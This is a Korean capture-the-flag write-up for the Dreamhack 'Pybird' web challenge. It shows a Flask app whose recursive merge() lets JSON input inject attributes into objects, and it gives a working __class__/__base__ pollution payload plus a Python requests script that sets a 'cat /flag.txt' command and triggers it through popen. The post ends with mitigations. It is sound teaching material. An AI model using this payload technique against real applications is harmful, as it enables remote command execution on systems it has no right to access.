---
title: "[CTF] 드림핵 Pybird"
date: 2025-09-19 22:20:00 +0900
categories: [CTF, Web]
tags: [CTF, Deserialization, Object Injection, Python]
description: "드림핵 Pybird"
toc: true
---

## 문제 개요

이번 문제는 Flask 기반의 간단한 멤버 관리 서비스이다. 역할(role)에 따라 다른 클래스 인스턴스를 생성하고, `principal` 역할인 경우에만 추가로 `merge()` 함수를 호출해 JSON(또는 form)으로 전달된 값을 객체에 병합한다. 이 병합 로직이 객체 속성을 임의로 덮어쓸 수 있게 설계되어 있어, 공격자가 `principal` 객체에 임의의 어트리뷰트를 주입하면 서버 측에서 해당 어트리뷰트를 사용해 명령을 실행할 수 있다.

* 취약 페이지: `/add_member` (POST, JSON 또는 form)
* 명령 실행 경로: `/execute` → `principal.command()` → `popen(command)`
* 취약점 핵심: `merge(src, dst)`가 사용자 입력을 객체에 재귀적으로 주입하여 임의 속성(예: `cmd`)을 추가 가능
* FLAG 위치: 서버 상의 `flag.txt` (예시)

---

## 문제에 제공된 원본 소스코드

아래는 문제에서 제공된 `app.py`의 핵심 부분이다.

```python
from flask import Flask, request, jsonify, render_template, redirect, url_for
from os import popen

app = Flask(__name__)

class Student:
    def __init__(self, name):
        self.name = name
        self.role = "student"

class Teacher(Student):
    def __init__(self, name):
        super().__init__(name)
        self.role = "teacher"

class SubstituteTeacher(Teacher):
    def __init__(self, name):
        super().__init__(name)
        self.role = "substitute_teacher"

class Principal(Teacher):
    def __init__(self, name):
        super().__init__(name)
        self.role = "principal"

    def command(self):
        command = self.cmd if hasattr(self, 'cmd') else 'echo Permission Denied'
        return f'{popen(command).read().strip()}'


def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

principal = Principal("principal")
members = []
members.append({"name":"admin", "role":"principal"})

@app.route('/execute', methods=['GET'])
def execute():
    return jsonify({"result": principal.command()})

@app.route('/add_member', methods=['GET', 'POST'])
def add_member():
    if request.method == 'POST':
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form
        name = data.get("name")
        role = data.get("role")
        if role == "principal":
            new_member = Principal(name)
            merge(data, new_member)
        ...
        members.append({"name": new_member.name, "role": new_member.role})
        return redirect(url_for('index'))
```

---

## 내가 실제로 푼 방법

핵심은 `merge()` 함수가 JSON 입력을 받아 `Principal` 객체의 속성을 사용자 입력으로 덮어쓰도록 허용하는 점이다. 이 동작을 이용하면 `principal` 객체에 `cmd` 어트리뷰트를 추가하여 `/execute` 호출 시 임의 명령을 실행시킬 수 있다.

### 공격 아이디어 요약

1. `/add_member`에 JSON으로 `role="principal"`을 주고, 구조체 형태로 `cmd` 값을 깊은 위치에 끼워넣어 `merge()`가 `Principal` 인스턴스에 `cmd` 속성을 설정하게 한다.
2. `/execute`를 호출하면 `principal.command()`가 `self.cmd`를 읽어 `popen()`으로 실행하므로, 예: `cat /flag.txt` 같은 명령 결과를 JSON으로 얻을 수 있다.

### 내가 사용한 페이로드

아래 페이로드는 JSON 바디로 `/add_member`에 POST하는 형식이다.

```json
{
  "name": "Exploited",
  "role": "principal",
  "__class__": {
    "__base__": {
      "__base__": {
        "cmd": "cat /flag.txt"
      }
    }
  }
}
```

* 이 페이로드는 `merge()` 호출 과정에서 `setattr()`을 통해 `principal` 객체에 `cmd` 어트리뷰트가 추가되도록 유도한다.

### 재현 예시

```python
import requests
base_url = 'http://<target>:5000'
payload = {
    "name": "Exploited",
    "role": "principal",
    "__class__": {
        "__base__": {
            "__base__": {
                "cmd": "cat /flag.txt"
            }
        }
    }
}
resp = requests.post(f'{base_url}/add_member', json=payload)
print(resp.status_code, resp.text)
# 이후
resp = requests.get(f'{base_url}/execute')
print(resp.json())
```

---

## 재현 흐름

1. 공격자: `/add_member`에 위 JSON 페이로드로 POST → `merge()`로 인해 `principal.cmd`가 설정됨
2. 공격자: `/execute` 요청 → `principal.command()`가 `self.cmd` 실행 → 명령 결과 반환(예: flag)

---

## 왜 이게 가능했나

* `merge()`는 외부 입력을 신뢰하고 객체의 속성을 그대로 덮어쓴다(심지어 재귀적으로).
* `Principal` 클래스의 `command()`는 `self.cmd`가 존재하면 이를 실행하도록 설계되어 있어, 외부에서 `cmd`를 주입하면 임의 명령 실행이 가능하다.
* 입력 검증, 허용 속성 화이트리스트, `merge()`의 안전한 구현이 없기 때문에 객체 인젝션(Object Injection) 취약점이 발생한다.

---

## 완화 및 권장 대책

* **절대 사용자 입력을 객체의 속성으로 직접 주입하지 말 것.** 특히 `setattr()` 같은 함수를 통해 내부 객체 상태를 변경하지 말자.
* **화이트리스트 방식의 속성 필터링**: 허용된 키와 값의 타입만 병합하도록 제한하라.
* **직렬화/역직렬화 안전**: 신뢰할 수 없는 JSON을 클래스 인스턴스로 직접 매핑하지 말 것.
* **원격 명령 실행 구조 제거**: `popen()` 등은 최소 권한/승인된 입력만 받도록 하거나 완전히 제거.
* **로그 및 모니터링**: 의심스러운 객체 변경과 관리자 권한 조작 시도 탐지.

---

## 마무리

Pybird 문제는 Python 객체 병합 로직의 위험성을 잘 보여주는 사례다. 외부 입력으로부터 객체 속성을 덮어쓰는 행위는 곧 권한 상승 및 원격 명령 실행으로 이어질 수 있으므로, 설계 단계에서부터 엄격한 입력 검증과 속성 제어가 필요하다.